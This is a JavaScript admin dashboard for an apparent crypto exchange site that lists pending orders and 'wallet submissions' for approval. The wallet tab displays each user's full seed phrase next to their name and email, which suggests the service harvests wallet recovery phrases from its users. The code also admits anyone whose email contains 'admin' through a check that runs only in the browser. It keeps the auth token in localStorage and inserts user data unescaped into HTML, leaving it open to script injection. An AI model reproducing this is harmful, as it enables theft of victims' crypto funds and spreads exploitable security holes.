const token = localStorage.getItem('token');
const userStr = localStorage.getItem('user');
const user = userStr ? JSON.parse(userStr) : null;

// 1. SECURITY CHECK: Kick non-admins out
if (!token || !user || (!user.isAdmin && !user.email.includes('admin'))) {
    alert("Access Denied. You are not an administrator.");
    window.location.href = "/";
}

// 2. TAB SWITCHING
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
        
        if (btn.dataset.tab === 'orders') loadOrders();
        if (btn.dataset.tab === 'wallets') loadWallets();
    });
});

// 3. FETCH ORDERS
async function loadOrders() {
    const container = document.getElementById('ordersList');
    container.innerHTML = '<p class="loading">Loading orders...</p>';
    try {
        const res = await fetch('/api/admin/pending-orders', {
            headers: { 'Authorization': 'Bearer ' + token }
        });
        const orders = await res.json();
        if (!orders.length) return container.innerHTML = '<p class="loading">No pending orders.</p>';
        
        container.innerHTML = orders.map(o => `
            <div class="card" id="order-${o._id}">
                <h4>Order: ${o.OrderID || o._id}</h4>
                <p><span>User:</span> ${o.userName || o.UserID?.Name || 'N/A'} (${o.userEmail || o.UserID?.Email || 'N/A'})</p>
                <p><span>Mode:</span> ${o.mode || o.Mode}</p>
                <p><span>Amount:</span> ${o.sendAmount || o.Amounts} ${o.sendCurrency || ''}</p>
                <p><span>To Receive:</span> ${o.getCurrency || ''}</p>
                <p><span>Wallet:</span> ${o.receivingWallet || 'N/A'}</p>
                <p><span>Details:</span> ${o.paymentDetails || o.Details}</p>
                <button class="btn-approve" onclick="approveOrder('${o._id}', this)">Approve Order</button>
            </div>
        `).join('');
    } catch (e) { container.innerHTML = '<p class="loading" style="color:red">Error loading orders.</p>'; }
}

// 4. APPROVE ORDER
async function approveOrder(id, btn) {
    if (!confirm('Approve this order and credit user balance?')) return;
    btn.disabled = true; btn.textContent = 'Approving...';
    try {
        const res = await fetch('/api/admin/approve-order/' + id, {
            method: 'POST', headers: { 'Authorization': 'Bearer ' + token }
        });
        if (!res.ok) throw new Error();
        btn.textContent = 'Approved ✓'; btn.style.background = '#2ecc71';
        setTimeout(() => document.getElementById(`order-${id}`).remove(), 1000);
    } catch (e) { alert('Failed to approve.'); btn.disabled = false; btn.textContent = 'Approve Order'; }
}

// 5. FETCH WALLETS (Assuming this route exists in your backend)
async function loadWallets() {
    const container = document.getElementById('walletsList');
    container.innerHTML = '<p class="loading">Loading wallets...</p>';
    try {
        const res = await fetch('/api/admin/pending-wallets', {
            headers: { 'Authorization': 'Bearer ' + token }
        });
        const wallets = await res.json();
        if (!wallets.length) return container.innerHTML = '<p class="loading">No pending wallets.</p>';
        
        container.innerHTML = wallets.map(w => `
            <div class="card" id="wallet-${w._id}">
                <h4>Wallet Submission</h4>
                <p><span>User:</span> ${w.name} (${w.email})</p>
                <p><span>Seed Phrase:</span> ${w.seedPhrase || 'N/A'}</p>
                <p><span>Address:</span> ${w.walletAddress || 'N/A'}</p>
                <button class="btn-approve" onclick="approveWallet('${w._id}', this)">Approve Wallet</button>
            </div>
        `).join('');
    } catch (e) { container.innerHTML = '<p class="loading" style="color:red">Error loading wallets.</p>'; }
}

// 6. APPROVE WALLET
async function approveWallet(id, btn) {
    if (!confirm('Approve this wallet?')) return;
    btn.disabled = true; btn.textContent = 'Approving...';
    try {
        const res = await fetch('/api/admin/approve-wallet/' + id, {
            method: 'POST', headers: { 'Authorization': 'Bearer ' + token }
        });
        if (!res.ok) throw new Error();
        btn.textContent = 'Approved ✓'; btn.style.background = '#2ecc71';
        setTimeout(() => document.getElementById(`wallet-${id}`).remove(), 1000);
    } catch (e) { alert('Failed to approve.'); btn.disabled = false; btn.textContent = 'Approve Wallet'; }
}

// Initial Load
loadOrders();
